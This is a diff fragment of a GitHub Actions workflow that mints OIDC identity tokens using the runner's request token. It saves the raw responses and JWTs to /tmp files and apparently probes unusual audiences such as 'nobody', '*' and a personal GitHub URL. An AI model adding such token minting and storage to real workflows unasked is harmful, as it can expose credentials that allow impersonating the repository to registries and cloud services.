@@ -32,6 +32,15 @@ jobs:
         run: |
           set +e
           mkdir -p /tmp/c10
+          # First: token with NO audience (default)
+          echo "=== AUD=<none> SAFE=DEFAULT ==="
+          RESP=$(curl -sS -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
+          echo "$RESP" > /tmp/c10/oidc_resp_DEFAULT.json
+          TOK=$(echo "$RESP" | jq -r '.value // empty')
+          if [ -n "$TOK" ]; then
+            echo "$TOK" > /tmp/c10/oidc_token_DEFAULT.jwt
+          fi
+
           AUDS=("https://github.com/fox32932" "nobody" "x" "https://npm.pkg.github.com" "sigstore" "*")
           for AUD in "${AUDS[@]}"; do
             SAFE="${AUD//[^a-zA-Z0-9]/_}"
